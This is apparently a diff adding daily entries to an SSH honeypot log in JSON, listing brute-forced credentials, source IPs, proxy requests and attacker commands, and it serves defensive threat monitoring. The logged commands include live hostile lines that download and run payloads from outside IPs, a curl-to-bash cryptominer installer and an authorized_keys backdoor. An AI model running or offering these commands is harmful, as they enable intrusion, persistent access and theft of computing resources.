+      "count": 603
+    },
+    {
+      "src_ip": "5.182.39.74",
+      "dst_port": 2222,
+      "count": 575
+    },
+    {
+      "src_ip": "45.227.255.205",
+      "dst_port": 2222,
+      "count": 546
+    },
+    {
+      "src_ip": "5.188.62.229",
+      "dst_port": 2222,
+      "count": 342
+    }
+  ],
+  "session_closed": [
+    {
+      "src_ip": "101.201.120.211",
+      "robot": true,
+      "count": 592
+    },
+    {
+      "src_ip": "45.227.255.205",
+      "robot": true,
+      "count": 546
+    },
+    {
+      "src_ip": "5.182.39.75",
+      "robot": false,
+      "count": 403
+    },
+    {
+      "src_ip": "5.182.39.74",
+      "robot": false,
+      "count": 352
+    },
+    {
+      "src_ip": "5.188.62.229",
+      "robot": false,
+      "count": 329
+    }
+  ],
+  "proxy_request": [
+    {
+      "src_ip": "5.182.39.75",
+      "dst_ip": "chekfast.zennolab.com",
+      "dst_port": 80,
+      "count": 1386
+    },
+    {
+      "src_ip": "5.182.39.75",
+      "dst_ip": "chek.zennolab.com",
+      "dst_port": 80,
+      "count": 1311
+    },
+    {
+      "src_ip": "5.182.39.75",
+      "dst_ip": "check2.zennolab.com",
+      "dst_port": 80,
+      "count": 802
+    },
+    {
+      "src_ip": "45.227.255.205",
+      "dst_ip": "ya.ru",
+      "dst_port": 80,
+      "count": 546
+    },
+    {
+      "src_ip": "5.188.62.229",
+      "dst_ip": "native-ps3.np.ac.playstation.net",
+      "dst_port": 443,
+      "count": 502
+    }
+  ]
+},
+{
   "date": "2021-06-12",
   "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02",
   "passwords": [
@@ -9843,6 +12125,339 @@
       "dst_ip": "ya.ru",
       "dst_port": 80,
       "count": 872
+    }
+  ]
+},
+{
+  "date": "2021-08-13",
+  "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02",
+  "passwords": [
+    {
+      "username": "root",
+      "password": "1234",
+      "count": 2875
+    },
+    {
+      "username": "user",
+      "password": "1",
+      "count": 15
+    },
+    {
+      "username": "root",
+      "password": "root",
+      "count": 11
+    },
+    {
+      "username": "minerstat",
+      "password": "msos",
+      "count": 10
+    },
+    {
+      "username": "root",
+      "password": "admin",
+      "count": 10
+    }
+  ],
+  "commands": [
+    {
+      "input": "cat /etc/issue",
+      "count": 24
+    },
+    {
+      "input": "uname -s -v -n -r",
+      "count": 15
+    },
+    {
+      "input": "uname -a",
+      "count": 8
+    },
+    {
+      "input": "echo Hi | cat -n",
+      "count": 5
+    },
+    {
+      "input": "ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*",
+      "count": 5
+    }
+  ],
+  "pre_disconnect_command": [
+    {
+      "input": "cat /etc/issue",
+      "count": 24
+    },
+    {
+      "input": "uname -s -v -n -r",
+      "count": 15
+    },
+    {
+      "input": "echo Hi | cat -n",
+      "count": 5
+    },
+    {
+      "input": "cd /dev/shm || cd /tmp || cd /var/run || cd /mnt; wget 198.98.56.65/krax || curl -o krax 198.98.56.65/krax; tar xvf krax; cd ._lul; chmod +x *; ./krn; ./krane Root12345",
+      "count": 2
+    },
+    {
+      "input": "cd /var/run ; rm -rf tsh ; tftp -g 127.0.0.1 -r tsh ; sh tsh &",
+      "count": 2
+    }
+  ],
+  "connect": [
+    {
+      "src_ip": "45.227.255.205",
+      "dst_port": 2222,
+      "count": 767
+    },
+    {
+      "src_ip": "5.182.39.74",
+      "dst_port": 2222,
+      "count": 762
+    },
+    {
+      "src_ip": "5.182.39.75",
+      "dst_port": 2222,
+      "count": 692
+    },
+    {
+      "src_ip": "5.188.62.229",
+      "dst_port": 2222,
+      "count": 246
+    },
+    {
+      "src_ip": "5.188.62.219",
+      "dst_port": 2222,
+      "count": 164
+    }
+  ],
+  "session_closed": [
+    {
+      "src_ip": "45.227.255.205",
+      "robot": true,
+      "count": 767
+    },
+    {
+      "src_ip": "5.182.39.74",
+      "robot": false,
+      "count": 394
+    },
+    {
+      "src_ip": "5.182.39.75",
+      "robot": true,
+      "count": 375
+    },
+    {
+      "src_ip": "5.182.39.74",
+      "robot": true,
+      "count": 368
+    },
+    {
+      "src_ip": "5.182.39.75",
+      "robot": false,
+      "count": 318
+    }
+  ],
+  "proxy_request": [
+    {
+      "src_ip": "5.182.39.74",
+      "dst_ip": "209.71.212.18",
+      "dst_port": 443,
+      "count": 1428
+    },
+    {
+      "src_ip": "5.182.39.75",
+      "dst_ip": "chekfast.zennolab.com",
+      "dst_port": 80,
+      "count": 1183
+    },
+    {
+      "src_ip": "5.182.39.75",
+      "dst_ip": "chek.zennolab.com",
+      "dst_port": 80,
+      "count": 1114
+    },
+    {
+      "src_ip": "5.182.39.75",
+      "dst_ip": "check2.zennolab.com",
+      "dst_port": 80,
+      "count": 976
+    },
+    {
+      "src_ip": "45.227.255.205",
+      "dst_ip": "ya.ru",
+      "dst_port": 80,
+      "count": 767
+    }
+  ]
+},
+{
+  "date": "2021-08-04",
+  "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02",
+  "passwords": [
+    {
+      "username": "root",
+      "password": "1234",
+      "count": 2604
+    },
+    {
+      "username": "nproc",
+      "password": "nproc",
+      "count": 370
+    },
+    {
+      "username": "minerstat",
+      "password": "msos",
+      "count": 17
+    },
+    {
+      "username": "user",
+      "password": "1",
+      "count": 14
+    },
+    {
+      "username": "root",
+      "password": "123456",
+      "count": 8
+    }
+  ],
+  "commands": [
+    {
+      "input": "uname -s -v -n -r",
+      "count": 609
+    },
+    {
+      "input": "uname -a",
+      "count": 382
+    },
+    {
+      "input": "uname -m",
+      "count": 378
+    },
+    {
+      "input": "w",
+      "count": 378
+    },
+    {
+      "input": "crontab -l",
+      "count": 378
+    }
+  ],
+  "pre_disconnect_command": [
+    {
+      "input": "uname -s -v -n -r",
+      "count": 609
+    },
+    {
+      "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+      "count": 377
+    },
+    {
+      "input": "pkill Opera; pkill Xorg; pkill x86_64; cd /tmp; curl -s -L https://raw.githubusercontent.com/C3Pool/xmrig_setup/master/setup_c3pool_miner.sh | bash -s 47v9mKikPcCZCq5mDn71ssWLDQ9UkrbiE2Tgu37BueHCHULTp5F6eHG1PA7X6o5RrW3tLjKVaCKrt23ATHn25hyy81iXQVL; pkill Xorg; pkill x86_64;",
+      "count": 26
+    },
+    {
+      "input": "uname -a;uptime",
+      "count": 25
+    },
+    {
+      "input": "cat /etc/issue; cd /tmp; wget http://45.133.9.32/x86_64; chmod 777 *; ./x86_64 x86xhed; rm -rf *",
+      "count": 15
+    }
+  ],
+  "connect": [
+    {
+      "src_ip": "202.61.244.149",
+      "dst_port": 2222,
+      "count": 868
+    },
+    {
+      "src_ip": "5.182.39.75",
+      "dst_port": 2222,
+      "count": 688
+    },
+    {
+      "src_ip": "5.182.39.74",
+      "dst_port": 2222,
+      "count": 645
+    },
+    {
+      "src_ip": "45.227.255.205",
+      "dst_port": 2222,
+      "count": 600
+    },
+    {
+      "src_ip": "5.188.62.219",
+      "dst_port": 2222,
+      "count": 278
+    }
+  ],
+  "session_closed": [
+    {
+      "src_ip": "202.61.244.149",
+      "robot": true,
+      "count": 868
+    },
+    {
+      "src_ip": "45.227.255.205",
+      "robot": true,
+      "count": 600
+    },
+    {
+      "src_ip": "5.182.39.75",
+      "robot": false,
+      "count": 430
+    },
+    {
+      "src_ip": "5.182.39.74",
+      "robot": false,
+      "count": 382
+    },
+    {
+      "src_ip": "5.188.62.219",
+      "robot": false,
+      "count": 268
+    }
+  ],
+  "file_download": [
+    {
+      "url": "http://45.133.9.32/x86_64",
+      "outfile": "var/lib/cowrie/downloads/af7a110b9654e30994c3f5ff1f79444adfe606f89f3685989e419acdd261321d",
+      "scans": {
+        "positives": 40,
+        "total": 62
+      },
+      "count": 1
+    }
+  ],
+  "proxy_request": [
+    {
+      "src_ip": "5.182.39.75",
+      "dst_ip": "check2.zennolab.com",
+      "dst_port": 80,
+      "count": 3007
+    },
+    {
+      "src_ip": "5.182.39.74",
+      "dst_ip": "209.71.212.18",
+      "dst_port": 443,
+      "count": 1056
+    },
+    {
+      "src_ip": "5.182.39.75",
+      "dst_ip": "chekfast.zennolab.com",
+      "dst_port": 80,
+      "count": 930
+    },
+    {
+      "src_ip": "45.227.255.205",
+      "dst_ip": "ya.ru",
+      "dst_port": 80,
+      "count": 600
+    },
+    {
+      "src_ip": "5.188.62.229",
+      "dst_ip": "213.180.204.24",
+      "dst_port": 443,
+      "count": 461
     }
   ]
 },
